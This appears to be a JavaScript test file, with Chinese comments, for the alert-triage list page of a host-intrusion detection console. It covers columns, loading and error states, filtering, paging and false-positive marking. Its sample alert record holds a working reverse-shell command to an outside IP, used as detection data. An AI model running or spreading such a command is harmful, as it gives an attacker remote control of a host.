// pages/alerts.js —— 研判记录主列表（P003-T015）：六格状态矩阵 + 列字段 + 筛选/排序下推 + 误报
//
// 断言口径（D020 / A2 / A4）：
//   - 一行就是一条研判记录，重复投递合成一行（repeat_count 沿用记录，不另造计数）；
//   - 点误报 → 这一行马上变误报、理由留在记录上，维护状态另标；
//   - 主列表**不请求 /api/alerts**（牧云没配时主列表不 503）；
//   - 队列条读不到只让队列条显示「状态不可用」，列表照常。
import { test, beforeEach } from 'node:test';
import { readFileSync } from 'node:fs';
import assert from 'node:assert/strict';

import {
  formatEventTime, maintenanceText, mountAlertsPage, repeatOf, typeLabelOf, verdictOf,
} from '../../pages/alerts.js';
import { setCredentials, clearCredentials } from '../../src/credentials.js';
import { flush, setupDom, text } from '../dom.js';

let dom = null;

beforeEach(() => {
  dom = setupDom();
  clearCredentials();
  setCredentials({ user: 'hids', password: 'hids-2026' });
});

const SUMMARY = {
  initialized: true, enabled: true, input_mode: 'syslog', last_poll_at: null,
  last_received_at: '2026-11-18T10:00:00.000Z', last_error: null,
  counts: { queued: 2, running: 1, done: 9, failed: 1 },
};

/** 列表项的真实形状（triage-monitor.js:128-151 的 cases() 返回键） */
function record(overrides = {}) {
  return {
    alert_id: 'syslog:revshell:0123456789abcdef:1732000000:11111111-2222-3333-4444-555555555555',
    matched_alert_id: null,
    result_alert_id: null,
    status: 'done',
    stage: '研判完成',
    detail: '研判记录已保存',
    created_at: '2026-11-18T09:00:00.000Z',
    updated_at: '2026-11-18T09:00:30.000Z',
    saved_at: '2026-11-18T09:00:30.000Z',
    case_dir: '/tmp/case',
    repeat_count: 1,
    verdict: 'threat',
    verdict_label: '真实威胁',
    summary: '反弹 Shell 外联，命令 bash -i 已落地',
    report: null,
    missing_evidence: [],
    next_actions: [],
    evidence_refs: [],
    evidence: [{ evidence_id: 'syslog:1', tool: 'syslog', fetched_at: '2026-11-18T09:00:00.000Z', sha256: 'a'.repeat(64) }],
    verified_facts: 2,
    evidence_sources: 1,
    msgid: 'cloudwalker-revshell',
    decision_source: 'ai',
    rule_id: null,
    event_time: 1732000000,
    host_ip: '10.0.0.5',
    source_ip: '45.9.1.2',
    command: 'bash -i >& /dev/tcp/45.9.1.2/4444 0>&1',
    ...overrides,
  };
}

function respond(body, status = 200) {
  return { status, ok: status >= 200 && status < 300, json: async () => body };
}

/**
 * 起页面。handler(url, init) 可覆盖默认回包；默认：cases 照 casesBody，队列照 SUMMARY。
 * @returns {{ host: HTMLElement, calls: {url:string, init:object}[], fetchImpl: Function }}
 */
function mount({ casesBody = { total: 1, cases: [record()] }, casesStatus = 200, summary = SUMMARY, summaryStatus = 200, handler } = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url: String(url), init });
    if (handler) {
      const custom = await handler(String(url), init);
      if (custom) return custom;
    }
    if (String(url).startsWith('/api/agent/triage/status')) return respond(summary, summaryStatus);
    if (String(url).startsWith('/api/agent/triage/cases')) return respond(casesBody, casesStatus);
    return respond({ error: '未预期的请求' }, 500);
  };
  const host = mountAlertsPage({ fetchImpl, now: () => new Date('2026-11-18T12:00:00.000Z') });
  document.body.append(host);
  return { host, calls, fetchImpl };
}

const rows = host => [...host.querySelectorAll('[data-role="rows"] tr')];
/** 只看列表请求（队列请求与它并发，谁最后落不确定） */
const caseCalls = calls => calls.filter(call => call.url.includes('/api/agent/triage/cases'));
const cellText = (host, column) => rows(host).map(row => text(row.querySelector(column)));

beforeEach(() => { dom = setupDom(); });

test('默认态：一行一条研判记录，列照 D020（类型/主机/时间/结论/重复/命中规则/维护/状态）', async () => {
  const { host, calls } = mount({
    casesBody: { total: 2, cases: [record(), record({ alert_id: 'syslog:honeypot:abcdef0123456789:1732000500:aaaabbbb-cccc-dddd-eeee-ffff00001111', msgid: 'cloudwalker-honeypot', verdict: null, verdict_label: null, status: 'queued', stage: '等待研判', rule_id: null, repeat_count: 3 })] },
  });
  await flush();

  assert.equal(text(host.querySelector('[data-role="total"]')), '2');
  assert.equal(rows(host).length, 2);
  assert.deepEqual(cellText(host, '.col-verdict'), ['真实威胁', '待研判']);
  assert.deepEqual(cellText(host, '.col-type'), ['反弹 Shell', '蜜罐']);
  assert.deepEqual(cellText(host, '.col-ip'), ['10.0.0.5', '10.0.0.5']);
  assert.deepEqual(cellText(host, '.col-dup'), ['×1', '×3']);
  assert.deepEqual(cellText(host, '.col-rule'), ['没有套上', '—']);
  assert.deepEqual(cellText(host, '.col-state'), ['完成', '排队中']);
  assert.equal(text(host.querySelector('[data-role="pager-info"]')), '1–2 / 2 条 · 共 1 页');

  // 队列条照接口
  assert.equal(text(host.querySelector('[data-role="qstate-text"]')), '运行中');
  assert.equal(text(host.querySelector('[data-role="qc-done"]')), '9');

  // A4：主列表不碰牧云现查
  assert.equal(calls.some(call => call.url.startsWith('/api/alerts')), false);
  assert.equal(calls.some(call => call.url.includes('/false-positive')), false);
});

test('格 1「加载」：首屏骨架 + aria-busy + 刷新/筛选禁用 + 读屏说明', async () => {
  let release;
  const gate = new Promise(resolve => { release = resolve; });
  const host = mountAlertsPage({
    fetchImpl: async () => { await gate; return respond({ total: 0, cases: [] }); },
    now: () => new Date('2026-11-18T12:00:00.000Z'),
  });
  document.body.append(host);
  await flush();
  assert.equal(text(host.querySelector('[data-role="rows"]')), '正在读取研判记录…');
  assert.equal(host.querySelector('[data-role="table-wrap"]').getAttribute('aria-busy'), 'true');
  assert.equal(host.querySelector('[data-role="refresh"]').disabled, true);
  assert.equal(host.querySelector('[data-role="filter-verdict"]').disabled, true);
  release();
  await flush();
});

test('格 2「空」：没有记录与筛选无匹配两套空态；清除筛选回第一页重取', async () => {
  const { host, calls } = mount({ casesBody: { total: 0, cases: [] } });
  await flush();
  assert.equal(text(host.querySelector('[data-role="rows"]')), '暂无研判记录。');

  const second = mount({ casesBody: { total: 0, cases: [] } });
  await flush();
  const verdictSelect = second.host.querySelector('[data-role="filter-verdict"]');
  verdictSelect.value = 'threat';
  verdictSelect.dispatchEvent(new second.host.ownerDocument.defaultView.Event('change'));
  await flush();
  assert.equal(text(second.host.querySelector('[data-role="rows"]')), '没有匹配的研判记录。清除筛选');
  second.host.querySelector('[data-role="rows"] button').click();
  await flush();
  const last = caseCalls(second.calls).at(-1).url;
  assert.match(last, /offset=0/);
  assert.doesNotMatch(last, /verdict=/);
});

test('格 3「部分失败」：队列状态读不到 → 队列条说实话，列表照常（A4）', async () => {
  const { host } = mount({ summaryStatus: 503, summary: { error: '自动研判尚未配置' } });
  await flush();
  assert.equal(text(host.querySelector('[data-role="qstate-text"]')), '状态不可用');
  assert.equal(text(host.querySelector('[data-role="qmode"]')), '—');
  assert.equal(host.querySelector('[data-role="qerror"]').hidden, false);
  assert.match(text(host.querySelector('[data-role="qerror"]')), /队列状态读取失败/);
  // 列表不受影响
  assert.equal(rows(host).length, 1);
  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '真实威胁');
});

test('格 4「错误」：列表 503 → 整页错误块与重试；重试成功后恢复', async () => {
  let fail = true;
  const { host } = mount({
    handler: async url => (fail && url.startsWith('/api/agent/triage/cases')
      ? respond({ error: '自动研判尚未配置' }, 503) : null),
  });
  await flush();
  const alert = host.querySelector('[data-role="rows"] [role="alert"]');
  assert.ok(alert);
  assert.match(text(alert), /自动研判未配置/);
  assert.match(text(alert), /服务端没有启用自动研判/);

  fail = false;
  [...alert.querySelectorAll('button')].find(button => text(button) === '重试').click();
  await flush();
  assert.equal(rows(host).length, 1);
  assert.equal(host.querySelector('[data-role="rows"] [role="alert"]'), null);
});

test('格 5「超长内容」：主机/命令/规则 id 全文进 DOM 与 title，视觉截断靠 CSS', async () => {
  const longHost = 'fe80::a1b2:c3d4:e5f6:7788%eth0-with-a-very-long-zone-name';
  const longRule = 'ssh_bruteforce_with_a_very_long_rule_identifier_for_testing_truncation';
  const { host } = mount({
    casesBody: { total: 1, cases: [record({ host_ip: longHost, rule_id: longRule, command: `bash -i ${'x'.repeat(200)}` })] },
  });
  await flush();
  const ip = host.querySelector('.col-ip .cell-ip');
  assert.equal(ip.textContent, longHost);
  assert.match(ip.getAttribute('title'), /来源 45\.9\.1\.2/);
  assert.match(ip.getAttribute('title'), /命令 bash -i x{10}/);
  const rule = host.querySelector('.col-rule .rule-id');
  assert.equal(rule.textContent, longRule);
  assert.equal(rule.getAttribute('title'), longRule);
});

test('格 6「禁用」：未完成与已误报的行不能登记误报，按钮说清原因', async () => {
  const { host } = mount({
    casesBody: {
      total: 3,
      cases: [
        record({ alert_id: 'syslog:a:0123456789abcdef:1:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', status: 'running', verdict: null, verdict_label: null }),
        record({ alert_id: 'syslog:b:0123456789abcdef:2:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', verdict: 'false_positive', verdict_label: '误报', maintenance: { status: 'updating', rule: { status: 'updating' }, wiki: { status: 'updating' } } }),
        record({ alert_id: 'syslog:c:0123456789abcdef:3:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee' }),
      ],
    },
  });
  await flush();
  const buttons = [...host.querySelectorAll('.col-ops button')];
  assert.equal(buttons[0].disabled, true);
  assert.match(buttons[0].title, /研判还没结束/);
  assert.equal(text(buttons[1]), '已误报');
  assert.equal(buttons[1].disabled, true);
  assert.equal(buttons[2].disabled, false);
  assert.equal(text(buttons[2]), '标为误报');
});

test('A2 误报：点开理由表单 → 提交 → 这一行立刻变误报，理由与维护状态都留在页面上', async () => {
  const { host, calls } = mount({
    handler: async (url, init) => {
      if (url.endsWith('/false-positive') && init?.method === 'POST') {
        return respond({
          alert_id: record().alert_id,
          verdict: { verdict: 'false_positive', verdict_label: '误报', source: 'human' },
          feedback: { reason: '内网扫描器固定脚本，已确认非攻击', who: 'hids', recorded_at: '2026-11-18T11:00:00.000Z' },
          maintenance: { status: 'updating', rule: { status: 'updating' }, wiki: { status: 'updating' } },
        }, 202);
      }
      return null;
    },
  });
  await flush();

  const button = host.querySelector('.col-ops button');
  button.click();
  await flush();

  const form = host.querySelector('.fp-row form');
  assert.ok(form, '行下应展开误报理由表单');
  const textarea = form.querySelector('textarea');
  assert.equal(document.activeElement, textarea, '打开表单应聚焦理由输入');

  // 太短：拦住，不发请求
  textarea.value = '误报';
  form.querySelector('.btn-primary').click();
  await flush();
  assert.match(text(form.querySelector('.fp-hint')), /理由要 10 到 4000 字/);
  assert.equal(calls.some(call => call.url.endsWith('/false-positive')), false);

  // 合格：POST 正文只有理由（who 由服务端取账号），回来立刻改行
  textarea.value = '内网扫描器固定脚本，已确认非攻击';
  form.querySelector('.btn-primary').click();
  await flush();

  const post = calls.find(call => call.url.endsWith('/false-positive'));
  assert.equal(post.init.method, 'POST');
  assert.deepEqual(JSON.parse(post.init.body), { reason: '内网扫描器固定脚本，已确认非攻击' });
  assert.match(decodeURIComponent(post.url), /\/api\/agent\/triage\/syslog:revshell:.*\/false-positive/);

  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '误报');
  assert.equal(text(rows(host)[0].querySelector('.col-maint')), '规则 更新中 · 知识库 更新中');
  assert.equal(host.querySelector('.fp-row'), null, '提交成功后表单收起');
  assert.equal(text(rows(host)[0].querySelector('.col-ops button')), '已误报');
  assert.match(text(host.querySelector('[data-role="sr-status"]')), /标成误报/);
});

test('A2 误报 409：研判还没结束时如实报错，行不变', async () => {
  const { host } = mount({
    handler: async url => (url.endsWith('/false-positive')
      ? respond({ error: '研判还没结束，不能登记误报' }, 409) : null),
  });
  await flush();
  host.querySelector('.col-ops button').click();
  await flush();
  const form = host.querySelector('.fp-row form');
  form.querySelector('textarea').value = '这条断言需要至少十个字';
  form.querySelector('.btn-primary').click();
  await flush();
  assert.match(text(form.querySelector('.fp-hint')), /研判还没结束/);
  assert.equal(text(rows(host)[0].querySelector('.col-verdict')), '真实威胁');
});

test('筛选与排序全部下推给接口（结论/类型/主机/时间/sort）', async () => {
  const { host, calls } = mount();
  await flush();
  const change = node => node.dispatchEvent(new host.ownerDocument.defaultView.Event('change'));

  const verdict = host.querySelector('[data-role="filter-verdict"]');
  verdict.value = 'threat';
  change(verdict);
  await flush();
  assert.match(caseCalls(calls).at(-1).url, /verdict=threat/);

  const type = host.querySelector('[data-role="filter-type"]');
  type.value = 'honeypot';
  change(type);
  await flush();
  assert.match(caseCalls(calls).at(-1).url, /type=honeypot/);

  const hostInput = host.querySelector('[data-role="filter-host"]');
  hostInput.value = ' 10.0.0.5 ';
  change(hostInput);
  await flush();
  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.5/);

  const time = host.querySelector('[data-role="filter-time"]');
  time.value = '24h';
  change(time);
  await flush();
  assert.match(caseCalls(calls).at(-1).url, /from=/);

  host.querySelector('[data-role="sort-verdict"]').click();
  await flush();
  const last = caseCalls(calls).at(-1).url;
  assert.match(last, /sort=verdict/);
  assert.equal(host.querySelector('[data-role="th-verdict"]').getAttribute('aria-sort'), 'descending');
  assert.equal(host.querySelector('[data-role="filter-count"]').textContent, '筛选后 1 条');
});

test('表格包裹层：类名与样式表对得上，横向滚动落在包裹层上（页面本身不横滚）', async () => {
  const { host } = mount();
  await flush();
  const wrap = host.querySelector('[data-role="table-wrap"]');
  assert.ok(wrap.classList.contains('table-wrap'), `包裹层类名应为 table-wrap，实际 ${wrap.className}`);
  assert.ok(wrap.querySelector('table.alerts'), '表格要住在包裹层里');
  // jsdom 不算布局：直接读样式文件，把「DOM 类名 ↔ CSS overflow-x」钉在一起（同 knowledge.test.js 的先例）
  const css = readFileSync(new URL('../../assets/pages/alerts.css', import.meta.url), 'utf8');
  assert.match(css, /\.table-wrap\s*\{[^}]*overflow-x:\s*auto/);
});

test('主机筛选：逐键输入各发一轮，回车不再发第二遍（复审 findings 2）', async () => {
  const { host, calls } = mount();
  await flush();
  const input = host.querySelector('[data-role="filter-host"]');
  const fire = type => input.dispatchEvent(new host.ownerDocument.defaultView.Event(type, { bubbles: true }));
  const before = caseCalls(calls).length;

  input.value = '10.';
  fire('input');
  await flush();
  input.value = '10.0.0.5';
  fire('input');
  await flush();
  const afterTyping = caseCalls(calls).length;
  assert.equal(afterTyping - before, 2, '每一键一轮取数');
  assert.match(caseCalls(calls).at(-2).url, /host=10\./);
  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.5/);

  // 回车：type=search 的浏览器会连发 search + change——值没变，一条都不发
  fire('search');
  fire('change');
  await flush();
  assert.equal(caseCalls(calls).length, afterTyping, '一次回车不能再发一轮相同请求');

  // 值真变了（比如粘贴后失焦）→ change 兜底仍要取一轮
  input.value = ' 10.0.0.6 ';
  fire('change');
  await flush();
  assert.equal(caseCalls(calls).length, afterTyping + 1);
  assert.match(caseCalls(calls).at(-1).url, /host=10\.0\.0\.6/);
});

test('主机逐键取数时不清表、不禁用输入框（否则打到一半输入框失焦）', async () => {
  let hold = false;
  let release;
  const gate = new Promise(resolve => { release = resolve; });
  const { host } = mount({
    handler: async url => {
      if (!hold || !String(url).startsWith('/api/agent/triage/cases')) return null;
      await gate;
      return respond({ total: 1, cases: [record({ host_ip: '10.0.0.9' })] });
    },
  });
  await flush();
  hold = true;
  const input = host.querySelector('[data-role="filter-host"]');
  input.value = '10.0.0.9';
  input.dispatchEvent(new host.ownerDocument.defaultView.Event('input', { bubbles: true }));
  await flush();

  assert.equal(input.disabled, false, '取数中主机输入框必须还能继续输入');
  assert.equal(rows(host).length, 1, '取数中保留上一轮的行，不闪骨架');
  assert.equal(host.querySelector('[data-role="table-wrap"]').hasAttribute('aria-busy'), false);
  release();
  await flush();
  assert.equal(text(rows(host)[0].querySelector('.col-ip')), '10.0.0.9');
});

test('主机逐键取数：先发的旧响应晚到也不许盖掉新结果', async () => {
  const pending = [];
  const custom = host => ({ total: 1, cases: [record({ host_ip: host })] });
  const { host: page } = mount({
    handler: url => {
      const u = String(url);
      if (!u.startsWith('/api/agent/triage/cases')) return null;
      const value = new URL(u, 'http://stub').searchParams.get('host');
      if (!value) return null;
      return new Promise(resolve => {
        pending.push({ value, done: () => resolve(respond(custom(value))) });
      });
    },
  });
  await flush();
  const input = page.querySelector('[data-role="filter-host"]');
  const fire = () => input.dispatchEvent(new page.ownerDocument.defaultView.Event('input', { bubbles: true }));

  input.value = '10.0.0.5';
  fire();
  await flush();
  input.value = '10.0.0.6';
  fire();
  await flush();
  assert.deepEqual(pending.map(item => item.value), ['10.0.0.5', '10.0.0.6']);

  pending[1].done();
  await flush();
  assert.equal(text(rows(page)[0].querySelector('.col-ip')), '10.0.0.6');
  pending[0].done();
  await flush();
  assert.equal(text(rows(page)[0].querySelector('.col-ip')), '10.0.0.6', '旧响应晚到不许把表格盖回去');
});

test('分页与每页条数：offset 跟着页码走，每页 50 回第一页', async () => {
  const { host, calls } = mount({ casesBody: { total: 120, cases: [record()] } });
  await flush();
  host.querySelector('[data-role="next-page"]').click();
  await flush();
  assert.match(caseCalls(calls).at(-1).url, /offset=20/);
  host.querySelector('[data-role="size-50"]').click();
  await flush();
  const last = caseCalls(calls).at(-1).url;
  assert.match(last, /count=50/);
  assert.match(last, /offset=0/);
});

test('每行都能进详情与深度溯源：链接带编码后的案件 ID', async () => {
  const { host } = mount({ casesBody: { total: 1, cases: [record({ alert_id: 'syslog:revshell:0123456789abcdef:1:uuid-1' })] } });
  await flush();
  const links = [...host.querySelectorAll('.col-ops a')].map(a => a.getAttribute('href'));
  const id = encodeURIComponent('syslog:revshell:0123456789abcdef:1:uuid-1');
  assert.deepEqual(links, [`#/alert-detail/${id}`, `#/trace-board/${id}`]);
});

test('可访问性：表格有 caption 与 th scope，队列条是带名字的 group，读屏有 aria-live', async () => {
  const { host } = mount();
  await flush();
  assert.ok(host.querySelector('table caption'));
  assert.ok([...host.querySelectorAll('th')].every(th => th.getAttribute('scope') === 'col'));
  assert.equal(host.querySelector('[data-role="queue"]').getAttribute('aria-label'), '自动研判队列');
  assert.equal(host.querySelector('[data-role="sr-status"]').getAttribute('aria-live'), 'polite');
  assert.ok(host.querySelector('[data-role="filter-host"]').getAttribute('aria-label'));
});

test('纯函数：事件时间、类型名、重复次数、维护文案都不编数据', () => {
  assert.equal(formatEventTime(1732000000), formatEventTime(new Date(1732000000 * 1000).toISOString()));
  assert.equal(formatEventTime('不是时间'), '—');
  assert.equal(formatEventTime(null), '—');
  assert.equal(typeLabelOf({ msgid: 'cloudwalker-revshell' }), '反弹 Shell');
  assert.equal(typeLabelOf({ msgid: 'unknown-msgid' }), 'unknown-msgid');
  assert.equal(typeLabelOf({}), '—');
  assert.equal(repeatOf({ repeat_count: 4 }), 4);
  assert.equal(repeatOf({}), 1);
  assert.equal(verdictOf({ verdict_label: '存疑' }), '存疑');
  assert.equal(verdictOf({}), null);
  assert.equal(maintenanceText({ maintenance: { status: 'failed', rule: { status: 'updated' }, wiki: { status: 'failed' } } }),
    '规则 已更新 · 知识库 失败');
  assert.equal(maintenanceText({}), '—');
});
